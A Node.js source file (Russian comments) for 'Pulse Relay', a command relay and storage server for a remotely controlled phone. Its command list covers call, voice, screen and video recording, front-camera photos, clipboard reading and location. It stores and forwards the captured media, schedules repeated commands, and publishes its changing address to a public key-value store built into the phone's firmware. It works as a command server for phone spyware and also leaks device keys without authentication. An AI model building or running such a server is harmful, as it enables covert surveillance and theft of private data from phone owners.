/**
 * Pulse Relay 2.0 — настоящий релей.
 *
 * Что делает:
 *  - HTTPS-сайт: открыл адрес → ввёл ключ устройства → панель подключилась.
 *  - WebSocket между телефоном и браузером: команды вниз, события вверх.
 *  - Хранилище: всё, что прислал телефон (скрины, видео, голос, старт/конец
 *    каждой функции, логи) лежит на сервере в папке data/<device>/ и доступно
 *    во вкладке «Хранилище». Плюс всё дублируется в Telegram-бот с телефона.
 *  - Планировщик задач на сервере: ставишь задачи по таймеру/интервалу,
 *    релей сам шлёт команды телефону (в т.ч. каждую минуту, несколько сразу,
 *    повторяющиеся и разные).
 *
 * Хранилище: плоские JSON-файлы + файлы вложений. Без внешних зависимостей.
 * Запуск:  node server.js  →  https://localhost:8443
 */
'use strict';

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const ROOT = __dirname;
const PUBLIC_DIR = fs.existsSync(path.join(ROOT, 'public', 'panel.html'))
  ? path.join(ROOT, 'public') : ROOT;      // панель может лежать и в корне, и в public/
const DATA = path.join(ROOT, 'data');
const CERT = path.join(ROOT, 'certs');
const BEHIND_PROXY = !!process.env.PORT;      // Render/Railway/Fly: TLS снимает хостинг
const PORT = parseInt(process.env.PORT || '8443', 10);
const HTTP_PORT = parseInt(process.env.HTTP_PORT || '8080', 10);
let LEARNED_URL = '';   // публичный адрес, выученный у туннеля
const MAX_BODY = 120 * 1024 * 1024;          // 120 МБ на вложение

fs.mkdirSync(DATA, { recursive: true });
fs.mkdirSync(CERT, { recursive: true });

/* ───────────────────────────── утилиты ───────────────────────────── */

const now = () => Date.now();
const uid = (n = 10) => crypto.randomBytes(n).toString('hex');
const day = () => new Date().toISOString().slice(0, 10);

function healthz(res) {
  res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify({ ok: true, version: '2.2', uptime: Math.round(process.uptime()),
                           devices: [...phones.keys()], at: now() }));
}

function json(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS'
  });
  res.end(body);
}

function readBody(req, limit = MAX_BODY) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', c => {
      size += c.length;
      if (size > limit) { reject(new Error('слишком большой файл')); req.destroy(); return; }
      chunks.push(c);
    });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

/* самоподписанный сертификат, чтобы HTTPS заработал без возни */
function ensureCert() {
  const key = path.join(CERT, 'key.pem');
  const crt = path.join(CERT, 'cert.pem');
  if (fs.existsSync(key) && fs.existsSync(crt)) return { key: fs.readFileSync(key), cert: fs.readFileSync(crt) };
  // openssl есть почти везде; если нет — падаем на HTTP
  const { execSync } = require('child_process');
  try {
    execSync(
      `openssl req -x509 -newkey rsa:2048 -nodes -keyout "${key}" -out "${crt}" -days 3650 ` +
      `-subj "/CN=pulse-relay" -addext "subjectAltName=DNS:localhost,IP:127.0.0.1"`,
      { stdio: 'ignore' }
    );
    return { key: fs.readFileSync(key), cert: fs.readFileSync(crt) };
  } catch (e) {
    return null;
  }
}

/* ───────────────────────────── хранилище ───────────────────────────── */

const store = {
  file(dev) { return path.join(DATA, dev.replace(/[^\w.-]/g, '_') + '.json'); },
  load(dev) {
    try { return JSON.parse(fs.readFileSync(this.file(dev), 'utf8')); }
    catch (e) { return { device: dev, key: '', tasks: [], events: [], files: [], createdAt: now() }; }
  },
  save(dev, db) {
    fs.writeFileSync(this.file(dev), JSON.stringify(db));
  },
  /** ключ устройства: генерится при первой регистрации, показывается в панели */
  ensureKey(dev) {
    const db = this.load(dev);
    if (!db.key) { db.key = uid(8); this.save(dev, db); }
    return db.key;
  },
  checkKey(dev, key) {
    if (!dev) return false;
    const db = this.load(dev);
    if (!db.key) { db.key = key || uid(8); this.save(dev, db); return true; }
    return String(key || '') === db.key;
  },
  addEvent(dev, ev) {
    const db = this.load(dev);
    ev.id = uid(6);
    ev.ts = ev.ts || now();
    db.events.unshift(ev);
    if (db.events.length > 2000) db.events.length = 2000;
    this.save(dev, db);
    return ev;
  },
  addFile(dev, meta) {
    const db = this.load(dev);
    meta.id = uid(8);
    meta.ts = now();
    meta.day = day();
    db.files.unshift(meta);
    if (db.files.length > 3000) db.files.length = 3000;
    this.save(dev, db);
    return meta;
  },
  tasks(dev) { return this.load(dev).tasks || []; },
  saveTasks(dev, tasks) { const db = this.load(dev); db.tasks = tasks; this.save(dev, db); }
};

/* ───────────────────────────── живые соединения ───────────────────────────── */

const queues = new Map();    // device → [{id, cmd, at}]
const lastSeen = new Map();  // device → ts последнего poll
const phones = new Map();    // device → ws
const panels = new Map();    // device → Set<ws>
const pending = new Map();   // reqId → {resolve, timer}

function sendToPhone(dev, obj) {
  const ws = phones.get(dev);
  const wsOk = ws && ws.readyState === 1;
  if (wsOk) ws.send(JSON.stringify(obj));
  // дублируем в очередь: телефон может быть на HTTP-poll, а не на WS
  if (obj.t === 'cmd') {
    if (!queues.has(dev)) queues.set(dev, []);
    const q = queues.get(dev);
    if (q.length < 200) q.push({ id: obj.req || uid(5), cmd: obj.cmd, at: now() });
  }
  return wsOk;
}

function broadcast(dev, obj) {
  const set = panels.get(dev);
  if (!set) return;
  const s = JSON.stringify(obj);
  for (const ws of set) { try { if (ws.readyState === 1) ws.send(s); } catch (e) {} }
}

/** команда, не подтверждённая 5 минут, выбрасывается — чтобы не копился мусор */
function expire(q) {
  const cut = now() - 5 * 60 * 1000;
  for (let i = q.length - 1; i >= 0; i--) {
    if (q[i].deliveredAt && q[i].deliveredAt < cut) q.splice(i, 1);
  }
}

function panelCount(dev) { const s = panels.get(dev); return s ? s.size : 0; }

/** команда телефону с ожиданием ответа (для «тест» и для планировщика) */
function askPhone(dev, cmd, timeoutMs = 25000) {
  return new Promise(resolve => {
    if (!sendToPhone(dev, { t: 'cmd', cmd, req: uid(5) })) { resolve({ ok: false, error: 'телефон не в сети' }); return; }
    const req = uid(5);
    pending.set(req, { resolve, timer: setTimeout(() => { pending.delete(req); resolve({ ok: false, error: 'нет ответа за ' + Math.round(timeoutMs / 1000) + 'с' }); }, timeoutMs) });
    sendToPhone(dev, { t: 'cmd', cmd, req });
  });
}

/* ───────────────────────────── планировщик ───────────────────────────── */

/**
 * Задача:
 *  { id, cmd, at (ms, для одноразовой), every (ms, повтор), cron текст не нужен,
 *    label, enabled, lastRun, runs, until }
 */
function scheduleTask(dev, task) {
  task.id = task.id || uid(6);
  task.createdAt = now();
  task.runs = 0;
  task.enabled = task.enabled !== false;
  const db = store.load(dev);
  db.tasks = db.tasks || [];
  db.tasks.push(task);
  store.save(dev, db);
  broadcast(dev, { t: 'tasks', tasks: db.tasks });
  return task;
}

function deleteTask(dev, id) {
  const db = store.load(dev);
  db.tasks = (db.tasks || []).filter(t => t.id !== id);
  store.save(dev, db);
  broadcast(dev, { t: 'tasks', tasks: db.tasks });
}

function toggleTask(dev, id, enabled) {
  const db = store.load(dev);
  for (const t of (db.tasks || [])) if (t.id === id) t.enabled = !!enabled;
  store.save(dev, db);
  broadcast(dev, { t: 'tasks', tasks: db.tasks });
}

/** Тик раз в 5 секунд: запускаем всё, чему пора. */
setInterval(async () => {
  const devs = new Set([...phones.keys(), ...panels.keys(), ...lastSeen.keys()]);
  for (const dev of devs) {
    let tasks;
    try { tasks = store.tasks(dev); } catch (e) { continue; }
    if (!tasks.length) continue;
    let dirty = false;
    for (const t of tasks) {
      if (!t.enabled) continue;
      const due = t.every ? (!t.lastRun || now() - t.lastRun >= t.every)
                          : (t.at && now() >= t.at && !t.lastRun);
      if (!due) continue;
      if (t.until && now() > t.until) { t.enabled = false; dirty = true; continue; }
      t.lastRun = now();
      t.runs = (t.runs || 0) + 1;
      dirty = true;
      const cmd = t.cmd;
      sendToPhone(dev, { t: 'cmd', cmd, req: uid(5), task: t.id });
      store.addEvent(dev, { kind: 'task', action: cmd, label: t.label || '', ts: now() });
      broadcast(dev, { t: 'taskRan', id: t.id, cmd, label: t.label || '', ts: now(), runs: t.runs });
      if (!t.every) t.enabled = false;               // одноразовые гасим
    }
    if (dirty) { const db = store.load(dev); db.tasks = tasks; store.save(dev, db); }
    if (dirty) broadcast(dev, { t: 'tasks', tasks });
  }
}, 5000);

/* ───────────────────────────── HTTP ───────────────────────────── */

const MIME = {
  '.html': 'text/html; charset=utf-8', '.js': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8', '.json': 'application/json; charset=utf-8',
  '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.webp': 'image/webp',
  '.mp4': 'video/mp4', '.ogg': 'audio/ogg', '.m4a': 'audio/mp4', '.mp3': 'audio/mpeg',
  '.pdf': 'application/pdf', '.txt': 'text/plain; charset=utf-8', '.svg': 'image/svg+xml'
};

/** устройства, о которых релей знает (по папкам с данными) */
function storesDevices() {
  try {
    return fs.readdirSync(DATA).filter(n => !n.endsWith('.json'));
  } catch (e) { return []; }
}

function serveStatic(res, file) {
  fs.readFile(file, (err, buf) => {
    if (err) { json(res, 404, { ok: false, error: 'не найдено' }); return; }
    res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] || 'application/octet-stream', 'Cache-Control': 'no-cache' });
    res.end(buf);
  });
}

async function handle(req, res) {
  const u = new URL(req.url, 'https://x');
  const p = u.pathname;

  if (req.method === 'OPTIONS') { json(res, 204, {}); return; }

  /* ── страницы ── */
  if (p === '/' || p === '/index.html') return serveStatic(res, path.join(PUBLIC_DIR, 'panel.html'));
  if (p.startsWith('/static/')) {
    const f = path.join(PUBLIC_DIR, p.replace('/static/', ''));
    if (!f.startsWith(PUBLIC_DIR)) return json(res, 403, { ok: false });
    return serveStatic(res, f);
  }

  /* ── API ── */
  if (p === '/healthz' || p === '/health') return healthz(res);
  if (p === '/api/health') return json(res, 200, {
    ok: true, up: process.uptime() | 0, version: '2.2',
    publicUrl: LEARNED_URL || process.env.PUBLIC_URL || '',
    anchor: { app: ANCHOR_APP, ok: anchorOk },
    devices: [...new Set([...phones.keys(), ...storesDevices()])]
  });

  /* что умеет релей — панель показывает это в «Настройках» */
  if (p === '/api/caps') return json(res, 200, {
    ok: true, version: '2.2',
    cmds: ['recvoice', 'reccall', 'recvideo', 'recscreen', 'recstop', 'recstatus',
           'mic', 'note', 'screenshot', 'photo', 'camfront', 'video', 'lock', 'wake',
           'torch', 'volume', 'say', 'find', 'open', 'fgapp', 'clip', 'clipset',
           'wifi', 'mobile', 'bright', 'wall', 'siren', 'location', 'apps'],
    features: { range: true, fetchFromPhone: true, learnUrl: true, twoPorts: true }
  });

  /* регистрация/проверка ключа устройства */
  if (p === '/api/key' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req, 4096)).toString() || '{}');
    const key = store.ensureKey(b.device || 'default');
    return json(res, 200, { ok: true, device: b.device || 'default', key });
  }

  if (p === '/api/key' && req.method === 'GET') {
    const dev = u.searchParams.get('device') || 'phone';
    return json(res, 200, { ok: true, device: dev, key: store.ensureKey(dev) });
  }

  /* подключение панели: нужен ключ */
  if (p === '/api/connect' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req, 4096)).toString() || '{}');
    const dev = String(b.device || 'default').trim();
    if (!store.checkKey(dev, b.key)) return json(res, 401, { ok: false, error: 'неверный ключ' });
    const db = store.load(dev);
    return json(res, 200, {
      ok: true, device: dev,
      online: phones.has(dev),
      tasks: db.tasks || [],
      events: (db.events || []).slice(0, 100),
      files: (db.files || []).slice(0, 60),
      counts: { events: (db.events || []).length, files: (db.files || []).length }
    });
  }

  /* события (в т.ч. старт/конец функций) */
  if (p === '/api/events' && req.method === 'GET') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const db = store.load(dev);
    return json(res, 200, { ok: true, events: (db.events || []).slice(0, 500) });
  }

  if (p === '/api/events' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req, 65536)).toString() || '{}');
    const dev = b.device || 'default';
    if (!store.checkKey(dev, b.key)) return json(res, 401, { ok: false });
    const ev = store.addEvent(dev, { kind: b.kind || 'log', action: b.action || '', phase: b.phase || '', text: b.text || '', data: b.data || null });
    broadcast(dev, { t: 'event', event: ev });
    return json(res, 200, { ok: true, event: ev });
  }

  /* файлы: список, приём */
  if (p === '/api/files' && req.method === 'GET') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const db = store.load(dev);
    return json(res, 200, { ok: true, files: (db.files || []).slice(0, 500) });
  }

  if (p === '/api/upload' && req.method === 'POST') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const buf = await readBody(req);
    const kind = u.searchParams.get('kind') || 'file';
    const name = (u.searchParams.get('name') || kind + '_' + now()).replace(/[^\w.\-]+/g, '_');
    const dir = path.join(DATA, dev.replace(/[^\w.-]/g, '_'), day());
    fs.mkdirSync(dir, { recursive: true });
    const fname = now() + '_' + name;
    const full = path.join(dir, fname);
    fs.writeFileSync(full, buf);
    const meta = store.addFile(dev, {
      kind, name, size: buf.length,
      mime: u.searchParams.get('mime') || 'application/octet-stream',
      url: '/media/' + encodeURIComponent(dev) + '/' + day() + '/' + encodeURIComponent(fname),
      caption: u.searchParams.get('caption') || ''
    });
    store.addEvent(dev, { kind: 'file', action: kind, text: caption_name(meta), ts: meta.ts });
    broadcast(dev, { t: 'file', file: meta });
    return json(res, 200, { ok: true, file: meta });
  }

  function caption_name(m) { return (m.name || '') + ' (' + Math.round((m.size || 0) / 1024) + ' КБ)'; }

  /* раздача файлов: с Range, чтобы голосовые и видео игрались и перематывались */
  if (p.startsWith('/media/')) {
    const parts = p.split('/').slice(2).map(decodeURIComponent);
    const full = path.join(DATA, ...parts);
    if (!path.resolve(full).startsWith(path.resolve(DATA))) return json(res, 403, { ok: false });
    let st;
    try { st = fs.statSync(full); } catch (e) { return json(res, 404, { ok: false, error: 'файла нет' }); }
    const type = MIME[path.extname(full).toLowerCase()] || 'application/octet-stream';
    const dl = u.searchParams.get('dl');
    const head = {
      'Content-Type': type,
      'Accept-Ranges': 'bytes',
      'Cache-Control': 'public, max-age=86400',
      'Access-Control-Allow-Origin': '*'
    };
    if (dl) head['Content-Disposition'] = `attachment; filename="${encodeURIComponent(path.basename(full))}"`;
    const rng = req.headers.range;
    if (rng) {
      const m = /bytes=(\d*)-(\d*)/.exec(rng);
      let start = m && m[1] ? parseInt(m[1], 10) : 0;
      let end = m && m[2] ? parseInt(m[2], 10) : st.size - 1;
      if (isNaN(start) || start < 0) start = 0;
      if (isNaN(end) || end >= st.size) end = st.size - 1;
      if (start > end) { res.writeHead(416, { 'Content-Range': `bytes */${st.size}` }); res.end(); return; }
      head['Content-Range'] = `bytes ${start}-${end}/${st.size}`;
      head['Content-Length'] = end - start + 1;
      res.writeHead(206, head);
      fs.createReadStream(full, { start, end }).pipe(res);
      return;
    }
    head['Content-Length'] = st.size;
    res.writeHead(200, head);
    fs.createReadStream(full).pipe(res);
    return;
  }

  /* задачи планировщика */
  if (p === '/api/tasks' && req.method === 'GET') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    return json(res, 200, { ok: true, tasks: store.tasks(dev) });
  }

  if (p === '/api/tasks' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req, 65536)).toString() || '{}');
    const dev = b.device || 'default';
    if (!store.checkKey(dev, b.key)) return json(res, 401, { ok: false });
    if (b.remove) { deleteTask(dev, b.remove); return json(res, 200, { ok: true }); }
    if (b.toggle) { toggleTask(dev, b.toggle, b.enabled); return json(res, 200, { ok: true }); }
    if (!b.cmd) return json(res, 400, { ok: false, error: 'нужна команда' });
    const t = scheduleTask(dev, {
      cmd: b.cmd, label: b.label || b.cmd,
      at: b.at ? Number(b.at) : undefined,
      every: b.every ? Number(b.every) : undefined,
      until: b.until ? Number(b.until) : undefined,
      enabled: b.enabled !== false
    });
    return json(res, 200, { ok: true, task: t });
  }

  /* команда телефону прямо сейчас */
  if (p === '/api/cmd' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req, 4096)).toString() || '{}');
    const dev = b.device || 'default';
    if (!store.checkKey(dev, b.key)) return json(res, 401, { ok: false });
    if (!b.cmd) return json(res, 400, { ok: false, error: 'пустая команда' });
    store.addEvent(dev, { kind: 'cmd', action: b.cmd, phase: 'start', text: b.cmd });
    const sent = sendToPhone(dev, { t: 'cmd', cmd: b.cmd, req: uid(5) });
    return json(res, 200, sent ? { ok: true } : { ok: false, error: 'телефон не в сети' });
  }

  /* последние события/файлы одним куском для панели */
  if (p === '/api/feed') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const db = store.load(dev);
    return json(res, 200, {
      ok: true, online: phones.has(dev),
      events: (db.events || []).slice(0, 200),
      files: (db.files || []).slice(0, 100),
      tasks: db.tasks || []
    });
  }

  /* ─── ТЕЛЕФОН: забирает команды (long-poll до 20с) ─── */
  if (p === '/api/phone/poll') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false, error: 'ключ' });
    lastSeen.set(dev, now());
    if (!queues.has(dev)) queues.set(dev, []);
    const q = queues.get(dev);
    const fresh = q.filter(c => !c.deliveredAt || now() - c.deliveredAt > 60000);
    expire(q);
    if (fresh.length) {
      fresh.slice(0, 20).forEach(c => { c.deliveredAt = now(); });
      return json(res, 200, { ok: true, now: now(), cmds: fresh.slice(0, 20).map(c => ({ id: c.id, cmd: c.cmd })) });
    }

    // Ждём появления команды. ВАЖНО: если клиент отвалился (curl -m 5, обрыв сети),
    // очередь НЕ забираем — иначе команда «сгорит» и телефон её никогда не увидит.
    let alive = true;
    res.on('close', () => { alive = false; });
    const waitStart = now();
    while (alive && now() - waitStart < 20000) {
      await new Promise(r => setTimeout(r, 250));
      if ((queues.get(dev) || []).length) break;
      if (res.writableEnded) { alive = false; break; }
    }
    lastSeen.set(dev, now());
    if (!alive || res.writableEnded) return;         // команды остаются в очереди
    const q2 = queues.get(dev) || [];
    const fresh2 = q2.filter(c => !c.deliveredAt || now() - c.deliveredAt > 60000).slice(0, 20);
    fresh2.forEach(c => { c.deliveredAt = now(); });
    return json(res, 200, { ok: true, now: now(), cmds: fresh2.map(c => ({ id: c.id, cmd: c.cmd })) });
  }

  /* ─── ТЕЛЕФОН: подтверждение выполнения (удаляет из очереди) ─── */
  if (p === '/api/phone/ack') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    lastSeen.set(dev, now());
    const ids = (u.searchParams.get('ids') || '').split(',').filter(Boolean);
    const q = queues.get(dev) || [];
    for (const id of ids) {
      const i = q.findIndex(c => c.id === id);
      if (i >= 0) q.splice(i, 1);
    }
    return json(res, 200, { ok: true, left: q.length });
  }

  /* ─── ПУБЛИЧНЫЙ АДРЕС (нужен телефону, когда туннель переехал) ─── */
  /* запоминаем публичный адрес по факту запроса через туннель */
  try {
    const fh = req.headers['x-forwarded-host'] || req.headers.host || '';
    if (fh && !/^(127\.|localhost|0\.0\.0\.0|\[::1\])/.test(String(fh)) && !/^\d+\.\d+\.\d+\.\d+/.test(String(fh))) {
      const scheme2 = (req.headers['x-forwarded-proto'] || 'https');
      LEARNED_URL = scheme2 + '://' + String(fh).split(':')[0];
    }
  } catch (e) {}

  if (p === '/api/beacon') {
    return json(res, 200, {
      ok: true,
      publicUrl: LEARNED_URL || process.env.PUBLIC_URL || '',
      version: '2.2',
      up: process.uptime() | 0
    });
  }

  /* ─── ТЕЛЕФОН: онлайн-статус для панели ─── */
  if (p === '/api/phone/seen') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    lastSeen.set(dev, now());
    return json(res, 200, { ok: true });
  }

  /* ─── панель → телефон: файл лежит на сайте, телефон его скачает ─── */
  if (p === '/api/phone/pushfile') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const rel = u.searchParams.get('path') || '';
    const name = u.searchParams.get('name') || ('relej_' + now());
    const mime = u.searchParams.get('mime') || 'application/octet-stream';
    if (!rel) return json(res, 400, { ok: false, error: 'нет пути' });
    if (!queues.has(dev)) queues.set(dev, []);
    if (queues.get(dev).length < 200)
      queues.get(dev).push({ id: uid(5), cmd: 'pullfile:' + rel + '|' + name + '|' + mime, at: now() });
    store.addEvent(dev, { kind: 'cmd', action: 'pushfile', phase: 'start', text: 'файл отправлен на телефон: ' + name });
    broadcast(dev, { t: 'event', event: store.load(dev).events[0] });
    return json(res, 200, { ok: true });
  }

  /* ─── телефон рапортует о старте/конце функции ─── */
  /* ─── панель просит телефон отдать файл из СВОЕГО хранилища ─── */
  if (p === '/api/phone/fetch') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false, error: 'неверный ключ' });
    const id = u.searchParams.get('id') || '';
    if (!id) return json(res, 400, { ok: false, error: 'нет id' });
    if (!queues.has(dev)) queues.set(dev, []);
    if (queues.get(dev).length < 200)
      queues.get(dev).push({ id: uid(5), cmd: 'sendto:' + id, at: now() });
    store.addEvent(dev, { kind: 'cmd', action: 'sendto', phase: 'start', text: 'просим файл из хранилища телефона: ' + id });
    return json(res, 200, { ok: true, queued: true, id });
  }

  if (p === '/api/phone/event' && req.method === 'POST') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    lastSeen.set(dev, now());
    const b = JSON.parse((await readBody(req, 65536)).toString() || '{}');
    const ev = store.addEvent(dev, { kind: b.kind || 'log', action: b.action || '', phase: b.phase || '', text: b.text || '' });
    broadcast(dev, { t: 'event', event: ev });
    return json(res, 200, { ok: true, id: ev.id });
  }

  /* ─── настройки, которые панель прокидывает телефону ─── */
  if (p === '/api/phone/info') {
    const dev = u.searchParams.get('device') || 'default';
    if (!store.checkKey(dev, u.searchParams.get('key'))) return json(res, 401, { ok: false });
    const ls = lastSeen.get(dev) || 0;
    return json(res, 200, {
      ok: true,
      online: now() - ls < 30000,
      lastSeen: ls,
      queued: (queues.get(dev) || []).length,
      tasks: store.tasks(dev).filter(t => t.enabled).length
    });
  }

  return json(res, 404, { ok: false, error: 'нет такого маршрута' });
}

/* ───────────────────────────── запуск ───────────────────────────── */

const cert = (process.env.FORCE_HTTP === '1' || BEHIND_PROXY) ? null : ensureCert();
let server;
if (cert) {
  server = https.createServer({ key: cert.key, cert: cert.cert }, (req, res) => {
    handle(req, res).catch(e => json(res, 500, { ok: false, error: String(e.message || e) }));
  });
} else {
  server = http.createServer((req, res) => {
    handle(req, res).catch(e => json(res, 500, { ok: false, error: String(e.message || e) }));
  });
}

const wss = new WebSocketServer({ server });

wss.on('connection', ws => {
  ws.isAlive = true;
  let role = null, dev = null;

  ws.on('message', raw => {
    let m;
    try { m = JSON.parse(raw.toString()); } catch (e) { return; }

    /* телефон представляется */
    if (m.t === 'hello' && m.role === 'phone') {
      dev = String(m.device || 'default');
      if (!store.checkKey(dev, m.key)) {
        store.ensureKey(dev);
        ws.send(JSON.stringify({ t: 'nokey', key: store.ensureKey(dev) }));
      }
      role = 'phone';
      phones.set(dev, ws);
      broadcast(dev, { t: 'online', online: true });
      store.addEvent(dev, { kind: 'sys', action: 'connect', text: 'телефон подключился' });
      return;
    }

    /* панель представляется */
    if (m.t === 'hello' && m.role === 'panel') {
      dev = String(m.device || 'default');
      if (!store.checkKey(dev, m.key)) { ws.send(JSON.stringify({ t: 'auth', ok: false })); ws.close(); return; }
      role = 'panel';
      if (!panels.has(dev)) panels.set(dev, new Set());
      panels.get(dev).add(ws);
      ws.send(JSON.stringify({ t: 'auth', ok: true, online: phones.has(dev) }));
      return;
    }

    if (role === 'phone') {
      /* телефон присылает событие/файл-метаданные/ответ на команду */
      if (m.t === 'event') {
        const ev = store.addEvent(dev, m.event || {});
        broadcast(dev, { t: 'event', event: ev });
      } else if (m.t === 'file') {
        const meta = store.addFile(dev, m.file || {});
        store.addEvent(dev, { kind: 'file', action: meta.kind, text: meta.name + ' (' + Math.round((meta.size || 0) / 1024) + ' КБ)' });
        broadcast(dev, { t: 'file', file: meta });
      } else if (m.t === 'cmdResult') {
        const p = pending.get(m.req);
        if (p) { clearTimeout(p.timer); pending.delete(m.req); p.resolve({ ok: m.ok !== false, result: m.result || '' }); }
        broadcast(dev, { t: 'cmdResult', cmd: m.cmd, ok: m.ok !== false, result: m.result || '' });
      } else if (m.t === 'pong') {
        ws.isAlive = true;
      }
      return;
    }

    if (role === 'panel') {
      if (m.t === 'cmd') {
        sendToPhone(dev, { t: 'cmd', cmd: m.cmd, req: m.req || uid(5) });
        store.addEvent(dev, { kind: 'cmd', action: m.cmd, phase: 'start', text: m.cmd });
      } else if (m.t === 'ping') {
        ws.send(JSON.stringify({ t: 'pong' }));
      }
    }
  });

  ws.on('close', () => {
    if (role === 'phone' && dev && phones.get(dev) === ws) {
      phones.delete(dev);
      broadcast(dev, { t: 'online', online: false });
      store.addEvent(dev, { kind: 'sys', action: 'disconnect', text: 'телефон отключился' });
    }
    if (role === 'panel' && dev && panels.has(dev)) panels.get(dev).delete(ws);
  });
});

setInterval(() => {
  for (const ws of wss.clients) { try { ws.ping(); } catch (e) {} }
}, 30000);

/* ─── ЯКОРЬ: публикуем свой адрес, чтобы телефон нашёл релей сам ─────────────
   Адрес меняется (туннель, новый VPS) — а телефон читает его из якоря.
   ANCHOR_APP — id хранилища (keyvalue.immanuel.co), вшит в прошивку.        */
const ANCHOR_APP = process.env.ANCHOR_APP || 'fywtu0cb';
const ANCHOR_BASE = process.env.ANCHOR_BASE || 'https://keyvalue.immanuel.co';
let anchorOk = false, anchorAt = 0;

function anchorPublish() {
  const url = LEARNED_URL || process.env.PUBLIC_URL ||
              process.env.RENDER_EXTERNAL_URL || '';
  if (!url) return;
  const enc = Buffer.from(url, 'utf8').toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const api = `${ANCHOR_BASE}/api/KeyVal/UpdateValue/${ANCHOR_APP}/relayurl/${enc}`;
  const req = https.request(api, { method: 'POST', headers: { 'Content-Length': 0 } }, res => {
    res.resume();
    if (res.statusCode === 200) {
      anchorOk = true; anchorAt = Date.now();
      console.log(`[anchor] адрес опубликован: ${url}`);
    }
  });
  req.on('error', () => {});
  req.setTimeout(8000, () => req.destroy());
  req.end();
}

setInterval(() => {
  if (!anchorOk || Date.now() - anchorAt > 10 * 60 * 1000) anchorPublish();
}, 60000);
setTimeout(anchorPublish, 3000);

/* В песочнице (без сертификатов) слушаем ДВА порта: 8443 и 8080 —
   туннель обычно прокидывает 8080, и так работает и одно, и другое. */
function tryListen(ports, i) {
  if (i >= ports.length) return;
  server.listen(ports[i], '0.0.0.0', () => {
    const scheme = cert ? 'https' : 'http';
    console.log(`Pulse Relay 2.2 → ${scheme}://0.0.0.0:${ports[i]}`);
    console.log(`Каталог данных: ${DATA}`);
  });
  server.once('error', (e) => {
    if (e && e.code === 'EADDRINUSE' && i + 1 < ports.length) tryListen(ports, i + 1);
  });
}

tryListen([...new Set([PORT, 10000, 8080, 8443])], 0);
if (false) server.listen(PORT, '0.0.0.0', () => {
  const scheme = cert ? 'https' : 'http';
  console.log(`Pulse Relay 2.0 → ${scheme}://0.0.0.0:${PORT}`);
  console.log(`Каталог данных: ${DATA}`);
});
if (!BEHIND_PROXY && !cert && HTTP_PORT !== PORT) {
  http.createServer((req, res) => server.emit('request', req, res)).listen(HTTP_PORT, '0.0.0.0', () => {
    console.log(`Pulse Relay 2.0 → http://0.0.0.0:${HTTP_PORT} (для туннеля)`);
  });
}

/* обычный HTTP для редиректа на HTTPS (в песочнице удобнее) */
if (!BEHIND_PROXY && cert) {
  http.createServer((req, res) => {
    res.writeHead(302, { Location: `https://${req.headers.host}:${PORT}${req.url}` });
    res.end();
  }).listen(HTTP_PORT, '0.0.0.0');
}
